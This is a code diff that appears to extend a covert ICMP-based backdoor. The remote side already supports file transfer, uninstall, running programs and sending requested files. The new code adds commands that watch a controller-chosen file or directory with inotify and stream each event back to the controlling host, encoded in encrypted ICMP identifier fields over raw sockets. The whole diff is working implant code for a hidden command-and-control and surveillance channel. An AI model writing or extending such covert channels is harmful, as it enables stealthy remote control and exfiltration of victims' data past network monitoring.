@@ -7,6 +7,7 @@ Usage:
 import argparse
 import hashlib
 import os
+import select
 import shutil
 import signal
 import socket
@@ -16,6 +17,7 @@ import sys
 import threading
 import time
 from dataclasses import dataclass, field
+from datetime import datetime
 
 from scapy.all import AsyncSniffer, ICMP, IP, TCP
 
@@ -30,10 +32,16 @@ CMD_TRANSFER_FILE = 2
 CMD_UNINSTALL = 3
 CMD_RUN_PROGRAM = 4
 CMD_REQUEST_FILE = 5
+CMD_WATCH_FILE = 6
+CMD_WATCH_DIR = 7
 ACK_READY = 0xFFFE
 ACK_META = 0xFFFD
 ACK_CHUNK = 0xFFFC
 ACK_END = 0xFFFB
+WATCH_STOP = 0xFFF7
+
+# Watch settings.
+WATCH_TIMEOUT_SECONDS = 600.0          # 10-minute hard ceiling per watch session
 
 RECEIVED_DIRECTORY = "received"
 RECEIVED_FALLBACK_NAME = "received_file"
@@ -505,6 +513,135 @@ def drain_for_end(recv_socket, send_socket, source_ip, my_ip, key, chunks_writte
             return
         if sequence == CHUNK_HEADER_SEQ and value in chunks_written:
             send_ack(send_socket, my_ip, source_ip, key, ACK_CHUNK, sequence=value)
+
+
+def _send_watch_event_line(send_socket, source_ip, dest_ip, key, line):
+    """Send one inotify event line to hosta with no ACK (fire-and-forget).
+    seq=0 carries the byte length; seq=1..N carry 2 bytes of UTF-8 text each."""
+    text = line.encode("utf-8")
+    n = len(text)
+    send_icmp_identifier(send_socket, source_ip, dest_ip,
+                         encrypt_identifier(n, key), 0)
+    for i in range((n + 1) // 2):
+        off = i * 2
+        hi = text[off]
+        lo = text[off + 1] if off + 1 < n else 0
+        send_icmp_identifier(send_socket, source_ip, dest_ip,
+                             encrypt_identifier((hi << 8) | lo, key), i + 1)
+
+
+def _watch_and_stream(ctx: Context, recursive: bool):
+    """Receive the path to watch from hosta, start inotify, and stream events back
+    until hosta sends WATCH_STOP or WATCH_TIMEOUT_SECONDS elapses."""
+    try:
+        from inotify_simple import INotify, flags as iflags
+    except ImportError:
+        print("[WATCH] inotify_simple not installed. Run: pip install inotify_simple")
+        return
+
+    PRIORITY_EVENTS = [
+        (iflags.MOVED_TO,    "MOVED_TO"),
+        (iflags.MOVED_FROM,  "MOVED_FROM"),
+        (iflags.CLOSE_WRITE, "CLOSE_WRITE"),
+        (iflags.CREATE,      "CREATE"),
+        (iflags.DELETE,      "DELETE"),
+        (iflags.ATTRIB,      "ATTRIB"),
+        (iflags.MODIFY,      "MODIFY"),
+    ]
+    watch_flags = (iflags.MOVED_TO | iflags.MOVED_FROM | iflags.CLOSE_WRITE |
+                   iflags.CREATE | iflags.DELETE | iflags.ATTRIB | iflags.MODIFY)
+
+    source_ip = detect_source_ip(ctx.connected_to)
+    try:
+        recv_socket = open_raw_icmp_recv_socket()
+        send_socket = open_raw_send_socket()
+    except PermissionError:
+        ctx.error_message = "permission denied (raw sockets require sudo)"
+        handle_error(ctx)
+
+    try:
+        try:
+            send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
+        except OSError as exc:
+            ctx.error_message = f"failed to send ack_ready: {exc}"
+            ctx.error_code = 2
+            handle_error(ctx)
+        print(f"[ACK_READY] sent to {ctx.connected_to}")
+
+        path_bytes = receive_byte_stream_chunked(
+            recv_socket, send_socket, source_ip, ctx.connected_to,
+            ctx.key, METADATA_TIMEOUT_SECONDS,
+        )
+        if path_bytes is None:
+            print("[WATCH] path receive failed; aborting")
+            return
+        watch_path = path_bytes.decode("utf-8", errors="replace")
+        print(f"[WATCH] path={watch_path!r} recursive={recursive}")
+
+        if not os.path.exists(watch_path):
+            print(f"[WATCH] path does not exist: {watch_path}")
+            try:
+                send_icmp_identifier(send_socket, source_ip, ctx.connected_to,
+                                     encrypt_identifier(0, ctx.key), END_SEQ)
+            except OSError:
+                pass
+            return
+
+        inotify = INotify()
+        inotify.add_watch(watch_path, watch_flags)
+        if recursive and os.path.isdir(watch_path):
+            for root, dirs, _ in os.walk(watch_path):
+                for d in dirs:
+                    inotify.add_watch(os.path.join(root, d), watch_flags)
+
+        print(f"[WATCH] watching — send stop from hosta or wait {WATCH_TIMEOUT_SECONDS}s")
+        deadline = time.time() + WATCH_TIMEOUT_SECONDS
+
+        while time.time() < deadline:
+            # Non-blocking check for WATCH_STOP from hosta.
+            readable, _, _ = select.select([recv_socket], [], [], 0)
+            if readable:
+                try:
+                    packet, _ = recv_socket.recvfrom(65535)
+                    if len(packet) >= 28:
+                        ihl = (packet[0] & 0x0F) * 4
+                        if len(packet) >= ihl + 8:
+                            icmp_hdr = packet[ihl:ihl + 8]
+                            icmp_type, _, _, identifier, _ = struct.unpack("!BBHHH", icmp_hdr)
+                            if icmp_type == 8:
+                                if decrypt_identifier(identifier, ctx.key) == WATCH_STOP:
+                                    print("[WATCH] stop signal received")
+                                    break
+                except OSError:
+                    pass
+
+            events = inotify.read(timeout=500)
+            for event in events:
+                names = [name for flag, name in PRIORITY_EVENTS if event.mask & flag]
+                if not names:
+                    continue
+                is_dir = bool(event.mask & iflags.ISDIR)
+                suffix = " [DIR]" if is_dir else ""
+                event_type = "|".join(names)
+                ts = datetime.now().strftime("%H:%M:%S")
+                line = f"{ts}  {event_type:<20} {event.name}{suffix}"
+                print(f"[WATCH] {line}")
+                try:
+                    _send_watch_event_line(send_socket, source_ip,
+                                           ctx.connected_to, ctx.key, line)
+                except OSError as exc:
+                    print(f"[WATCH] send error: {exc}")
+
+        inotify.close()
+        try:
+            send_icmp_identifier(send_socket, source_ip, ctx.connected_to,
+                                 encrypt_identifier(0, ctx.key), END_SEQ)
+        except OSError:
+            pass
+        print("[WATCH] done")
+    finally:
+        recv_socket.close()
+        send_socket.close()
 
 
 def receive_byte_metadata(recv_socket, source_ip, key, timeout):
@@ -1045,6 +1182,12 @@ if __name__ == "__main__":
             elif command_code == CMD_REQUEST_FILE:
                 print("\nSending requested file...")
                 send_file(ctx)
+            elif command_code == CMD_WATCH_FILE:
+                print("\nStarting file watch...")
+                _watch_and_stream(ctx, recursive=False)
+            elif command_code == CMD_WATCH_DIR:
+                print("\nStarting directory watch...")
+                _watch_and_stream(ctx, recursive=True)
             else:
                 print(f"Ignoring unknown command code {command_code}.")
 
